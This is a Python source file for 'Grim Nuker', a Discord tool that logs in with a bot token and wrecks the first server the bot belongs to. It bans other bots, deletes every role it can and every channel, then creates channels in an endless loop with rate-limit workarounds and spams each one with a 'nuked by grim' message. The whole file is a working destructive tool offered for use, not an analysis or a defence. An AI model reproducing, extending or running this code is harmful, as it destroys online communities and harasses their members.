# Grim Nuker — Copyright (C) 2026 JustBuddyy
# Licensed under the GNU General Public License v3.0.

import discord, asyncio, json, os, shutil

CONFIG_PATH = "config.json"

def load_config():
    if not os.path.exists(CONFIG_PATH):
        if os.path.exists("config.example.json"):
            shutil.copy("config.example.json", CONFIG_PATH)
        else:
            json.dump({"channel_name": "nuked-by-grim",
           "message": "This server got nuked by grim!",
           "advertise": True, "spam_count": 5},
          open(CONFIG_PATH, "w"), indent=2)
    return json.load(open(CONFIG_PATH))

def save_config(cfg):
    json.dump(cfg, open(CONFIG_PATH, "w"), indent=2)

async def safe(coro, label, console):
    try:
        await coro
        console.log(f"[green]OK[/]   {label}")
    except discord.HTTPException as e:
        if e.status == 429:
            await asyncio.sleep(1)
            try:
                await coro
                console.log(f"[green]OK[/]   {label} [dim](after 429)[/]")
                return
            except Exception as e2:
                console.log(f"[yellow]SKIP[/] {label} - {e2}")
        else:
            console.log(f"[yellow]SKIP[/] {label} - HTTP {e.status}")
    except discord.Forbidden:
        console.log(f"[yellow]SKIP[/] {label} - no perms")
    except Exception as e:
        console.log(f"[yellow]SKIP[/] {label} - {e}")

async def nuke(guild, cfg, client, console, dry=False):
    me = guild.me

    console.rule("[bold red]Step 1 — Banning bots/apps")
    for m in list(guild.members):
        if m.bot and m.id != client.user.id:
            if dry: console.log(f"[cyan]WOULD BAN[/] {m}")
            else:   await safe(guild.ban(m, reason="nuke"), f"ban {m}", console)

    console.rule("[bold red]Step 2 — Deleting roles")
    for role in sorted(guild.roles, reverse=True):
        if role.name == "@everyone":
            continue
        if role >= me.top_role:
            console.log(f"[yellow]SKIP[/] role {role.name} - above bot")
            continue
        if dry: console.log(f"[cyan]WOULD DELETE ROLE[/] {role.name}")
        else:   await safe(role.delete(), f"role {role.name}", console)

    console.rule("[bold red]Step 3 — Deleting channels")
    for ch in list(guild.channels):
        if dry: console.log(f"[cyan]WOULD DELETE CHANNEL[/] #{ch.name}")
        else:   await safe(ch.delete(), f"#{ch.name}", console)

    if not cfg["advertise"]:
        return

    console.rule("[bold red]Step 4 — Flooding channels")
    created = []
    while True:
        try:
            c = await guild.create_text_channel(cfg["channel_name"])
            created.append(c)
            console.log(f"[cyan]CREATED[/] {c.name} ({len(created)})")
            await asyncio.sleep(0.15)
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(1.5); continue
            console.log(f"[yellow]STOP[/] channel creation - HTTP {e.status}")
            break
        except Exception as e:
            console.log(f"[yellow]STOP[/] channel creation - {e}")
            break

    if dry:
        console.log(f"[cyan]WOULD SPAM[/] {cfg['spam_count']} msgs x {len(created)} channels")
        return

    console.rule("[bold red]Step 5 — Spamming messages")
    async def spam(c):
        for _ in range(cfg["spam_count"]):
            await safe(c.send(cfg["message"]), f"msg -> #{c.name}", console)
    await asyncio.gather(*[spam(c) for c in created])

async def run_nuke(token, cfg, console, dry=False):
    intents = discord.Intents.default()
    intents.members = True
    intents.guilds = True
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        console.rule(f"[bold green]Logged in as {client.user}")
        try:
            guild = client.guilds[0]
            console.print(f"[bold]Target:[/] {guild.name} ({guild.id}) — {guild.member_count} members")
            await nuke(guild, cfg, client, console, dry)
        except Exception as e:
            console.log(f"[red]FATAL[/] {e}")
        finally:
            console.print("[bold green]Done. Logging out.")
            await client.close()

    try:
        await client.start(token)
    except discord.LoginFailure:
        console.log("[red]Bad token[/]")
    except Exception as e:
        console.log(f"[red]Error[/] {e}")
